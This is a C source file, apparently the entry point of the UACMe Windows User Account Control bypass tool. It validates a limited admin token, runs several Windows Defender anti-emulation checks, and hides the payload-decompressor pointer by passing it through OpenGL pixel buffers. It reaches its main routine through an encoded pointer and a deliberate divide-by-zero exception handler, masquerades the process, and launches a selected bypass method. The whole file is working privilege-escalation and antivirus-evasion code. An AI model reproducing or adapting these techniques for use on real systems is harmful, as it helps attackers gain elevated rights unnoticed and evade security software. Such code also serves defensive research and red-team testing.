/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2019
*
*  TITLE:       MAIN.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  Program entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#define OEMRESOURCE
#include "global.h"
#include <gl\GL.h>
#pragma comment(lib, "opengl32.lib")
#pragma comment(lib, "comctl32.lib")

//Runtime context global variable
PUACMECONTEXT g_ctx;

//Image Base Address global variable
HINSTANCE g_hInstance;

TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "(=^..^=)" };

static pfnDecompressPayload pDecompressPayload = NULL;

/*
* ucmDummyWindowProc
*
* Purpose:
*
* Part of antiemulation, does nothing, serves as a window for ogl operations.
*
*/
LRESULT CALLBACK ucmDummyWindowProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
)
{
    switch (uMsg) {
    case WM_CLOSE:
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
* Note:
*
* supHeapAlloc unavailable during this routine and calls from it.
*
*/
NTSTATUS ucmInit(
    _Inout_ UCM_METHOD *RunMethod,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    BOOL        cond = FALSE;
    UCM_METHOD  Method;
    NTSTATUS    Result = STATUS_SUCCESS;
    PVOID       Ptr;
    LPWSTR      optionalParameter = NULL;
    ULONG       optionalParameterLength = 0;
    MSG         msg1;
    WNDCLASSEX  wincls;
    BOOL        rv = 1;
    HWND        TempWindow;
    HGLRC       ctx;
    HDC         dc1;
    int         index;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR WndClassName[] = TEXT("reirraC");
    WCHAR WndTitleName[] = TEXT("igakA");

    PIXELFORMATDESCRIPTOR pfd = {
        sizeof(PIXELFORMATDESCRIPTOR),
        1,
        PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER | PFD_SWAP_EXCHANGE | PFD_GENERIC_ACCELERATED,
        PFD_TYPE_RGBA,
        32, 8, 0, 8, 0, 8, 0, 8, 0,
        0, 0, 0, 0, 0, 32, 0, 0,
        PFD_MAIN_PLANE, 0, 0, 0, 0
    };

    do {

        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = STATUS_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        if (g_hInstance == NULL)
            g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;

        if (*RunMethod == UacMethodInvalid) {

            bytesIO = 0;
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
            if (bytesIO == 0)
                return STATUS_INVALID_PARAMETER;

            Method = (UCM_METHOD)strtoul(szBuffer);
            *RunMethod = Method;

        }
        else {
            Method = *RunMethod;
        }

#ifndef _DEBUG
        if (Method == UacMethodTest)
            return STATUS_INVALID_PARAMETER;
#endif
        if (Method >= UacMethodMax)
            return STATUS_INVALID_PARAMETER;

#ifndef _DEBUG
        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return STATUS_NOT_SUPPORTED;
            }
        }
        else {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }
#endif

        //
        // Process optional parameter.
        //
        if ((OptionalParameter == NULL) || (OptionalParameterLength == 0)) {

            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
            bytesIO = 0;
            GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &bytesIO);
            if (bytesIO > 0) {
                optionalParameter = (LPWSTR)&szBuffer;
                optionalParameterLength = bytesIO;
            }

        }
        else {
            optionalParameter = OptionalParameter;
            optionalParameterLength = OptionalParameterLength;
        }

        wincls.cbSize = sizeof(WNDCLASSEX);
        wincls.style = CS_OWNDC;
        wincls.lpfnWndProc = &ucmDummyWindowProc;
        wincls.cbClsExtra = 0;
        wincls.cbWndExtra = 0;
        wincls.hInstance = g_hInstance;
        wincls.hIcon = NULL;
        wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
        wincls.hbrBackground = NULL;
        wincls.lpszMenuName = NULL;
        wincls.lpszClassName = WndClassName;
        wincls.hIconSm = 0;
        RegisterClassEx(&wincls);

        TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, g_hInstance, NULL);

        //
        // Flashes and sparks.
        //
        dc1 = GetDC(TempWindow);
        index = ChoosePixelFormat(dc1, &pfd);
        SetPixelFormat(dc1, index, &pfd);
        ctx = wglCreateContext(dc1);
        wglMakeCurrent(dc1, ctx);
        glDrawBuffer(GL_BACK);
        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
        glMatrixMode(GL_PROJECTION);
        glLoadIdentity();
        glBegin(GL_TRIANGLES);
        glColor4i(1, 0, 1, 0);
        glVertex2i(-1, -1);
        glVertex2i(0, 1);
        glVertex2i(1, -1);
        glEnd();
#pragma warning(push)
#pragma warning(disable: 4054)//code to data
        Ptr = (PVOID)&DecompressPayload;
#pragma warning(pop)
        pDecompressPayload = NULL;
#ifdef _WIN64
        glDrawPixels(2, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
        glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecompressPayload);
#else
        glDrawPixels(1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
        glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecompressPayload);
#endif
        SwapBuffers(dc1);
        SendMessage(TempWindow, WM_CLOSE, 0, 0);

        do {
            rv = GetMessage(&msg1, NULL, 0, 0);

            if (rv == -1)
                break;

            TranslateMessage(&msg1);
            DispatchMessage(&msg1);
        } while (rv != 0);

        UnregisterClass(WndClassName, g_hInstance);

        g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
            optionalParameter,
            optionalParameterLength,
            pDecompressPayload,
            OutputToDebugger);


    } while (cond);

    if (g_ctx == NULL) {
        Result = STATUS_FATAL_APP_EXIT;
    }

    return Result;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
NTSTATUS WINAPI ucmMain(
    _In_opt_ UCM_METHOD Method,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    NTSTATUS    Status;
    UCM_METHOD  method = Method;

    wdCheckEmulatedVFS();

    Status = ucmInit(&method,
        OptionalParameter,
        OptionalParameterLength,
        OutputToDebugger);

    switch (Status) {

    case STATUS_ELEVATION_REQUIRED:
        ucmShowMessage(OutputToDebugger, TEXT("Please enable UAC for this account."));
        break;

    case STATUS_NOT_SUPPORTED:
        ucmShowMessage(OutputToDebugger, TEXT("Admin account with limited token required."));
        break;

    case STATUS_INVALID_PARAMETER:
        ucmShowMessage(OutputToDebugger, T_USAGE_HELP);
        break;

    case STATUS_FATAL_APP_EXIT:
        return Status;
        break;

    default:
        break;

    }

    if (Status != STATUS_SUCCESS) {
        return Status;
    }

    supMasqueradeProcess(FALSE);

    return MethodsManagerCall(method);
}

/*
* ucmSehHandler
*
* Purpose:
*
* Program entry point seh handler, indirect control passing.
*
*/
INT ucmSehHandler(
    _In_ UINT ExceptionCode,
    _In_ EXCEPTION_POINTERS *ExceptionInfo
)
{
    UACME_THREAD_CONTEXT *uctx;

    UNREFERENCED_PARAMETER(ExceptionInfo);

    if (ExceptionCode == STATUS_INTEGER_DIVIDE_BY_ZERO) {
        uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
        while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
            uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
        }
        if (uctx) {
            if (uctx->ucmMain) {
                uctx->ucmMain = (pfnEntryPoint)supDecodePointer(uctx->ucmMain);
                
                uctx->ReturnedResult = uctx->ucmMain(UacMethodInvalid, 
                    NULL, 
                    0, 
                    FALSE);
            }
        }
        return EXCEPTION_EXECUTE_HANDLER;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

#undef COMPILE_AS_DLL

typedef struct _CALLEE_PARAMS {
    UCM_METHOD Method;
    LPWSTR OptionalParameter;
    ULONG OptionalParameterLength;
    BOOL OutputToDebugger;
} CALLEE_PARAMS, *PCALLEE_PARAMS;

/*
* ucmCalleeThread
*
* Purpose:
*
* Worker thread, mostly for COM.
*
*/
DWORD WINAPI ucmCalleeThread(_In_ LPVOID lpParameter)
{
    CALLEE_PARAMS *Params = (PCALLEE_PARAMS)lpParameter;   

    ExitThread(ucmMain(Params->Method,
        Params->OptionalParameter,
        Params->OptionalParameterLength,
        Params->OutputToDebugger));
}

/*
* ucmRunMethod
*
* Purpose:
*
* Dll only export.
*
*/
NTSTATUS WINAPI ucmRunMethod(
    _In_ UCM_METHOD Method,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
#ifdef COMPILE_AS_DLL
    HANDLE hCalleeThread;
    DWORD ThreadId, ExitCode = 0;
    CALLEE_PARAMS Params;

    if (wdIsEmulatorPresent2()) {
        RtlRaiseStatus(STATUS_TRUST_FAILURE);
    }

    if (wdIsEmulatorPresent() == STATUS_NOT_SUPPORTED) {

        Params.Method = Method;
        Params.OptionalParameter = OptionalParameter;
        Params.OptionalParameterLength = OptionalParameterLength;
        Params.OutputToDebugger = OutputToDebugger;

        hCalleeThread = CreateThread(NULL,
            0,
            (LPTHREAD_START_ROUTINE)ucmCalleeThread,
            &Params,
            0,
            &ThreadId);

        if (hCalleeThread) {
            WaitForSingleObject(hCalleeThread, INFINITE);
            GetExitCodeThread(hCalleeThread, &ExitCode);
            CloseHandle(hCalleeThread);
            return ExitCode;
        }

    }
    return STATUS_ACCESS_DENIED;
#else
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(OptionalParameter);
    UNREFERENCED_PARAMETER(OptionalParameterLength);
    UNREFERENCED_PARAMETER(OutputToDebugger);
    return STATUS_NOT_IMPLEMENTED;
#endif
}

#ifndef COMPILE_AS_DLL
/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
#pragma comment(linker, "/ENTRY:main")
VOID __cdecl main()
{
    int v = 1, d = 0;
    UACME_THREAD_CONTEXT uctx;

    RtlSecureZeroMemory(&uctx, sizeof(uctx));

    if (wdIsEmulatorPresent() == STATUS_NOT_SUPPORTED) {

        uctx.Frame.Context = &g_fctx;
        uctx.ucmMain = (pfnEntryPoint)supEncodePointer(ucmMain);
        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);

        __try {
            v = (int)USER_SHARED_DATA->NtProductType;
            d = (int)USER_SHARED_DATA->AlternativeArchitecture;
            v = (int)(v / d);
        }
        __except (ucmSehHandler(GetExceptionCode(), GetExceptionInformation())) {
            v = 1;
        }

        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
    }
    if (v > 0)
        ExitProcess(uctx.ReturnedResult);
}

#else

/*
* DllMain
*
* Purpose:
*
* Dll entry point.
*
*/
#pragma comment(linker, "/DLL /ENTRY:DllMain")
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {
        LdrDisableThreadCalloutsForDll(hinstDLL);
        g_hInstance = hinstDLL;
    }

    return TRUE;
}

#endif //COMPILE_AS_DLL
